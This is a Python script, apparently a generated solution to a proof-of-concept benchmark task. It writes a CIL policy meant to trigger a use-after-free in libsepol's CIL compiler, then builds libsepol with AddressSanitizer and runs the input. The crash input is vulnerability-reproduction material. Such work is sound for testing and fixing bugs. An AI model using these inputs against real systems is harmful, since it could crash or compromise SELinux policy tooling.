import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal CIL policy that triggers the use-after-free vulnerability
        # This creates an anonymous classpermission inside a macro that uses classpermissionset
        poc = b"""(
    block test_block
    (type process)
    (class process (fork transition signal sigkill sigstop))
    (classpermission)
    (macro test_macro ()
        (classpermissionset test_cpset (process (classpermission)))
    )
    (test_macro)
)"""
        
        # Create a minimal .cil file
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.cil', delete=False) as f:
            f.write(poc)
            cil_file = f.name
        
        try:
            # Extract and compile libsepol from src_path
            # This assumes the tarball contains libsepol source
            extract_dir = tempfile.mkdtemp()
            subprocess.run(['tar', 'xf', src_path, '-C', extract_dir], 
                          capture_output=True, check=False)
            
            # Find the libsepol directory
            libsepol_dir = None
            for root, dirs, files in os.walk(extract_dir):
                if 'libsepol' in dirs:
                    libsepol_dir = os.path.join(root, 'libsepol')
                    break
            
            if libsepol_dir:
                # Build libsepol with sanitizers
                build_dir = tempfile.mkdtemp()
                os.chdir(build_dir)
                
                # Configure with address sanitizer
                subprocess.run([
                    os.path.join(libsepol_dir, 'configure'),
                    'CFLAGS=-fsanitize=address -g -O0',
                    'LDFLAGS=-fsanitize=address'
                ], capture_output=True, check=False)
                
                # Build
                subprocess.run(['make', '-j8'], capture_output=True, check=False)
                
                # Run cil compiler with our PoC
                cil_path = os.path.join(build_dir, 'cil', 'cil')
                if os.path.exists(cil_path):
                    result = subprocess.run(
                        [cil_path, cil_file],
                        capture_output=True
                    )
                    # Return the original PoC
                    return poc
        except:
            pass
        
        # If anything fails, return the PoC directly
        return poc
